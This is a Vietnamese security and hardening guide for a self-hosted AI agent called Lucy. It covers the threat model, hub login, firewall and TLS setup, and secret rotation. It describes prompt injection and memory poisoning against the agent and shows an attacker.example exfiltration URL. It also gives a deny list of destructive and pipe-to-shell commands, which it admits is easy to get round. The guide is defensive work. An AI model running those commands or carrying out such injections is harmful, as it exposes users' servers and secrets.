# Bảo mật

Lucy là một AI agent có shell, có quyền đọc ghi file, giữ API key của bạn, và bạn điều khiển cô qua chat. Hãy coi một bản cài Lucy như một quyền đăng nhập SSH vào server: ai nói chuyện được với Lucy thì trên thực tế chạy được lệnh dưới quyền user mà Lucy đang chạy.

Trang này nói rõ Lucy bảo vệ những gì theo mặc định, còn hở ở đâu, và cách gia cố một bản cài.

## Mô hình mối đe doạ

| Tài sản | Vì sao quan trọng |
|---|---|
| Server | Claude chạy với toàn quyền dùng tool (Bash, đọc/ghi file) dưới user của PM2 |
| Secret | Token bot Telegram, key provider LLM, thông tin đăng nhập MCP (GitHub, Google…), `AM_TOKEN`, mật khẩu hub, tất cả nằm trong file env trên máy |
| Vault trí nhớ | Thông tin cá nhân và preference Lucy đã học. Nó cũng là đầu vào cho mọi lượt trả lời sau này |
| Tài khoản của bạn | Mọi thứ với tới được qua MCP server hoặc token mà Lucy đang giữ |

Các đường tấn công chính:

1. **Người khác nói chuyện được với Lucy.** Bot Telegram để ngỏ, mật khẩu hub yếu, hoặc hub mở ra internet mà không có TLS.
2. **Prompt injection.** Chỉ thị giấu trong trang web, file, email, issue hay kết quả tool mà Lucy đọc, khiến cô làm điều bạn không hề yêu cầu.
3. **Chuỗi cung ứng.** Skill, MCP server hoặc gói npm/pip độc hại.
4. **Đầu độc trí nhớ.** "Fact" hay preference bị cài vào, được ghi xuống vault rồi lái các lượt sau.
5. **Rò rỉ dữ liệu.** Secret bị chép vào log, trí nhớ, lịch sử chat hoặc API của bên thứ ba.

## Lucy làm sẵn những gì

### Danh sách được phép trên Telegram

Bridge chỉ trả lời user Telegram có ID số khớp với `LUCY_ALLOWED_USER_ID` (trong `bridge/.env`). Người khác nhận "⛔ Không có quyền."

::: danger Đặt biến này trước khi chạy bot
Nếu `LUCY_ALLOWED_USER_ID` **để trống, bridge từ chối khởi động**. Cách duy nhất để chạy ở chế độ mở là đặt thêm `LUCY_ALLOW_ANYONE=1`; khi đó bridge trả lời bất kỳ ai tìm ra bot và tin nhắn trạng thái hiện `uid=(mở!)`. Đừng làm vậy. Luôn đặt ID:

```ini
LUCY_ALLOWED_USER_ID=<id-telegram-dạng-số-của-bạn>
```
:::

### Tắt link preview

Mọi tin bridge gửi đi đều qua một hàm chung, hàm này đặt `link_preview_options.is_disabled = true`. Để tạo link preview, server Telegram sẽ tự mở URL, nên một link bị cài kiểu `https://attacker.example/?d=<secret>` có thể làm lộ dữ liệu mà không cần ai bấm vào. Tin đẩy từ lịch của hub, cảnh báo của token guard và báo cáo của cron dream ban đêm cũng tắt preview, nên mọi tin Telegram Lucy gửi đi đều không có preview. Bridge còn thay token bot bằng `<bot-token>` trong log lỗi.

### Đăng nhập hub

| Lớp bảo vệ | Chi tiết |
|---|---|
| Mật khẩu | `LUCY_HUB_PASSWORD`. Để trống thì không thể đăng nhập (hub cảnh báo khi khởi động) |
| So sánh timing-safe | Cả hai phía được băm SHA-256 rồi so bằng `crypto.timingSafeEqual` |
| Khoá theo IP | Sai 5 lần (mật khẩu hoặc mã 2FA) trong 15 phút thì IP đó bị chặn tới hết khung thời gian (HTTP 429) |
| Phiên hết hạn | Token ngẫu nhiên 24 byte trong cookie `httpOnly`, `SameSite=Lax`, có `Secure` khi chạy HTTPS, hiệu lực 7 ngày. Phiên nằm trong bộ nhớ và bị xoá khi hub restart |
| TOTP tuỳ chọn | Bật ở Settings → 2FA (xem [Web hub](./web-hub#bat-2fa)) |
| Mọi route API | Đều kiểm tra cookie phiên. Đọc file bị giới hạn trong `LUCY_PROJECTS_ROOT`, dọn trí nhớ bị giới hạn trong vault |
| Sau proxy | `trust proxy` chỉ tin loopback, nên cơ chế khoá thấy đúng IP thật của client do nginx chuyển tới |

Bộ đếm khoá và phiên nằm trong bộ nhớ, nên sẽ reset khi hub restart. Secret TOTP lưu dạng văn bản thường ở `$LUCY_STATE/twofa.json`; hãy giữ thư mục này kín (`chmod 700`).

### Dịch vụ chỉ nghe localhost

| Dịch vụ | Cổng | Bind |
|---|---|---|
| `lucy-hub` | 8800 | `LUCY_HUB_HOST`. **Mặc định trong code là `0.0.0.0`**; file mẫu `.env.runtime.example` đặt `127.0.0.1` |
| `lucy-coordinator` | 8780 | Mặc định `127.0.0.1` (`AM_HOST`), worker xác thực bằng `AM_TOKEN` |
| `lucy-pxpipe` | 47821 | `127.0.0.1` |
| `noteflow-view` | 8090 | `127.0.0.1` |

Chỉ nginx được đối mặt với internet. Kiểm tra cổng đang nghe:

```bash
ss -ltnp | grep -E ':(8800|8780|47821|8090)\b'   # chỉ nên thấy 127.0.0.1
```

### Môi trường sạch trong PM2

`ecosystem.config.cjs` đặt `filter_env: true` cho mọi process, nên biến môi trường của shell nơi bạn gõ `pm2 start` (ID phiên, mật khẩu bạn lỡ export) **không** lọt vào process của Lucy. Mỗi process chỉ nhận giá trị từ `.env.llm`, `agent-machine/.env`, `bridge/.env` và `.env.runtime` (file sau đè file trước). PM2 cũng cảnh báo lúc khởi động nếu thiếu `LUCY_HUB_PASSWORD` hoặc `AM_TOKEN`.

### Che secret trước khi ghi vào trí nhớ

Cùng một bộ quy tắc che secret có ở ba nơi (`agent-machine/src/redact.ts`, hàm `scrub_secrets` của bridge, và `scrubSecrets` của hub). Chúng thay bằng `[REDACTED]`:

- `Bearer <token>`
- key bắt đầu bằng `sk-`, `rk-`, `pk-`, `jina_`, `ghp_`/`gho_`/`ghs_`/`ghr_`/`github_pat_`, `xox?-` (Slack) và `AKIA…` (AWS)
- `TEN_API_KEY=…`, `…_TOKEN=…`, `…_SECRET=…`, `…PASSWORD=…` (giữ tên biến, che giá trị)
- chuỗi dài kiểu base64 trông ngẫu nhiên (từ 40 ký tự, lẫn hoa thường và số, hoặc có `+`, `/`, `=`)

Việc che chạy **trước khi** một lượt chat được lưu vào trí nhớ episodic, trước khi lưu tóm tắt phiên, trước khi gửi văn bản sang API embedding, và trước khi lưu phiên Prompt Architect.

Nó **không** phủ hết mọi chỗ. File lịch sử chat của hub (`$LUCY_STATE/chats/`), nhật ký sự kiện của hub và log PM2 vẫn giữ nguyên những gì đã gõ. Vì vậy đừng dán secret vào chat, hãy đặt chúng trong file env.

### Token guard {#token-guard}

Ngân sách token theo ngày cho bảng việc agent. Nó giữ được qua các lần restart và reset lúc nửa đêm theo múi giờ `LUCY_TZ_OFFSET` (mặc định UTC+7):

| Biến | Mặc định | Khi chạm ngưỡng |
|---|---|---|
| `AM_DAY_TOKEN_SOFT` | 800.000.000 | Executor bị hạ xuống model rẻ nhất; cảnh báo qua Telegram |
| `AM_DAY_TOKEN_HARD` | 1.500.000.000 | Card mới phải chờ bạn quyết; autopilot dừng; báo động qua Telegram |

Mặc định rất cao. Hãy đặt ngưỡng hợp với túi tiền của bạn trong `agent-machine/.env`. Cùng file đó còn có giới hạn USD: trần mỗi card (`AM_PER_CARD_USD`, mặc định $2), trần cho mỗi khung 5 giờ trượt (`AM_CAP_USD`, mặc định $20) và trần theo tuần (`AM_WEEKLY_CAP_USD`, mặc định $120). Guard này canh chi tiêu của bảng việc. Nó không chặn chat từ Telegram hay hub.

### Giới hạn của autopilot

Autopilot không bao giờ tự duyệt gate `devops`, `security` hay pipeline `secure-ship`, và dừng sau `AM_AUTOPILOT_MAX` lần quyết. Xem [Tự động hoá](./automations#autopilot-cho-agent).

## Lỗ hổng đã biết: toàn quyền

::: warning Lucy hiện chạy Claude mà không hỏi quyền
Hub (chat, lịch, dọn máy VPS), bridge Telegram, worker của bảng việc và autopilot đều khởi động Claude với `permissionMode: bypassPermissions` và biến môi trường `IS_SANDBOX=1`. Hai thứ này khiến Claude Code bỏ qua mọi bước xác nhận "cho phép chạy lệnh này không?", và `IS_SANDBOX=1` còn cho chế độ đó chạy được dưới root.
:::

Điều đó có nghĩa là:

- Bất kỳ chỉ thị nào tới được Claude, của bạn hay bị cài vào, đều có thể chạy lệnh shell, sửa hoặc xoá file, đọc file env và gửi request ra mạng **mà không hỏi**.
- "Danh sách được phép" và quy tắc "không được đụng" của các nút dọn máy VPS chỉ là chỉ dẫn trong prompt. Không có gì cưỡng chế chúng.
- `IS_SANDBOX=1` **không** tạo ra sandbox. Nó chỉ báo cho CLI biết rằng nó đang ở trong sandbox.
- Worker của bảng việc có thể bật thêm lớp chặn Bash bằng `LUCY_HOOKS=1`. Khi đó một hook `PreToolUse` chặn các lệnh khớp mẫu như `rm -rf /`, `git push`, `mkfs`, `dd if=`, `curl … | sh`, `shutdown`, hay lệnh PM2 restart bridge. Đây là danh sách cấm nên dễ bị lách. Nó không áp dụng cho chat trên hub hay Telegram.

Cách giảm rủi ro:

1. **Đừng chạy Lucy bằng root.** Tạo một user riêng, chỉ cho user đó sở hữu các thư mục của Lucy, và chạy PM2 dưới user đó (`pm2 startup -u lucy`). Khi đó một lệnh xấu chỉ phá được file của user này.
2. **Chạy Lucy trên một máy không có gì quý giá khác**, như một VPS nhỏ dành riêng, một VM hoặc container. Đừng chạy trên máy đang giữ dữ liệu của người khác hay database production.
3. **Giữ thông tin đăng nhập quan trọng ngoài env.** Cấp cho MCP server và token phạm vi hẹp nhất có thể (ví dụ token GitHub fine-grained chỉ cho vài repo).
4. **Nên bật `LUCY_HOOKS=1`** trên worker, và giữ gate được bảo vệ (devops, security) cho mọi thứ có deploy.
5. **Bỏ `bypassPermissions`** đòi hỏi sửa code (đổi permission mode và dùng `allowedTools`/`disallowedTools`, hoặc dùng sandbox thật). Làm vậy thì một số tính năng sẽ cần bạn xác nhận.

## Danh sách gia cố

### 1. Tường lửa: chỉ mở 22, 80 và 443

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose
```

Đừng mở 8800, 8780, 47821 hay 8090. Gỡ các rule thừa còn sót lại từ lúc thử nghiệm. Gia cố SSH luôn: chỉ dùng key (`PasswordAuthentication no`), và cân nhắc `fail2ban`.

### 2. TLS cho hub

Không có TLS thì mật khẩu, mã TOTP và cookie phiên đi qua mạng dưới dạng chữ thường. Chọn một trong các cách:

**nginx + certbot** (domain công khai). Chép `hub/nginx-lucy.conf.example` sang `/etc/nginx/sites-available/lucy`, đặt `server_name hub.example.com`, bật site, rồi:

```bash
sudo nginx -t && sudo systemctl reload nginx
sudo certbot --nginx -d hub.example.com      # tự thêm 443 và chuyển hướng HTTP→HTTPS
```

Giữ `LUCY_HUB_HOST=127.0.0.1` để chỉ nginx tới được hub.

**Tailscale** (riêng tư). Không mở hub ra public. Giữ hub ở `127.0.0.1` và chỉ công bố trong tailnet của bạn, ví dụ `tailscale serve --bg 8800`. Khi đó có thể đóng luôn 80/443 nếu không còn gì cần tới chúng.

**Cloudflare Tunnel.** `cloudflared` kết nối từ trong ra, nên không cần mở cổng vào. Trỏ tunnel tới `http://127.0.0.1:8800`, và cân nhắc đặt Cloudflare Access phía trước.

Cách nào cũng vậy, hãy bật 2FA trong Settings.

### 3. Secret mạnh và không dùng lại

- `LUCY_HUB_PASSWORD`: dài và ngẫu nhiên, ví dụ `openssl rand -base64 24`.
- `AM_TOKEN`: ngẫu nhiên, ví dụ `openssl rand -hex 32`.
- File env: `chmod 600`, thuộc user chạy Lucy, không bao giờ commit (đã có trong gitignore).

### 4. Xem kỹ skill và MCP server trước khi cài

Skill là chỉ dẫn mà Claude làm theo với toàn quyền, còn MCP server là code chạy bằng thông tin đăng nhập của bạn.

- Đọc hết `SKILL.md` và mọi script đi kèm. Để ý `curl | sh`, đoạn dữ liệu mã hoá, request tới host lạ, và chỉ dẫn đọc file env hay gửi dữ liệu ra ngoài.
- Ưu tiên MCP server từ nguồn bạn tin, ghim phiên bản, và cấp token với phạm vi hẹp nhất.
- Bật MCP từng server một (`LUCY_MCP_<ID>=on`) và theo dõi tab **Kết nối**.
- Chỉ duyệt skill do Lucy tự đề xuất (`skills/_proposed/`) sau khi đã đọc kỹ.

### 5. Prompt injection

Mọi thứ Lucy đọc đều có thể chứa chỉ thị: trang web, PDF, email, issue GitHub, output của tool, kể cả tên file.

- Cẩn thận khi nhờ Lucy "đọc link này rồi làm theo", nhất là trong lượt có quyền chạy shell.
- Khi được, dùng model **lane** không có tool để tóm tắt văn bản không đáng tin.
- Giữ link preview ở trạng thái tắt (mặc định), và đừng bật lại trong script của bạn.
- Để ý các lệnh gọi tool bất thường trong thẻ 🔧 của chat hub.

### 6. Đầu độc trí nhớ

Vault của Lucy đi vào mọi lượt trả lời sau này qua recall và `active.md`.

- Thỉnh thoảng xem **Bộ não → Đã học**. Bấm 👎 với preference sai, và ghim (📌) những cái quan trọng.
- Đọc báo cáo dream ban đêm trên Telegram, và `Brain/proposals/consolidate-<ngày>.md` khi bước gộp chạy.
- Giữ vault trong git (vault là một repo riêng) để xem diff và quay lui được: `git -C <vault> log -p`.
- Trước khi chạy script QA hay test có nói chuyện với Lucy, hãy snapshot vault rồi khôi phục sau đó. Các lượt chạy ấy sẽ ghi vào trí nhớ.

### 7. Thay secret định kỳ

Thay ngay nếu một secret có thể đã lộ (dán vào chat, lọt vào ảnh chụp màn hình, lỡ commit), còn lại thì thay theo định kỳ:

| Secret | Thay ở đâu |
|---|---|
| Token bot Telegram | `@BotFather` → `/revoke`, rồi cập nhật `bridge/.env` |
| API key provider | Trang quản lý của từng provider, rồi `.env.llm` |
| Token MCP (GitHub, Google…) | Ở phía provider, rồi `.env.llm` |
| `AM_TOKEN` | `agent-machine/.env` (coordinator và worker đọc cùng giá trị) |
| `LUCY_HUB_PASSWORD` | `.env.runtime` (restart hub cũng kết thúc mọi phiên) |
| TOTP | Settings → tắt 2FA → bật lại với mã QR mới |

PM2 chỉ đọc file env khi process khởi động, nên sau khi sửa:

```bash
pm2 delete <tên> && pm2 start ecosystem.config.cjs --only <tên>
```

### 8. Sao lưu

Sao lưu những thứ sau thường xuyên, và giữ ít nhất một bản ở ngoài server:

| Cái gì | Ở đâu (mặc định) |
|---|---|
| Vault trí nhớ | `LUCY_VAULT` (là repo git; push lên remote **private**) |
| Trạng thái hub | `LUCY_STATE` (`~/.lucy-hub/`): chat, lịch, secret 2FA, nhật ký sự kiện |
| Dữ liệu bảng việc | `AM_DATA` trong `agent-machine/.env` |
| File env | `.env.llm`, `.env.runtime`, `agent-machine/.env`, `bridge/.env`. Nhớ mã hoá, vì chúng chứa secret |
| Crontab | `crontab -l > crontab.backup` |

Thử khôi phục ít nhất một lần. Bản sao lưu chưa từng được khôi phục thì chỉ là phỏng đoán.
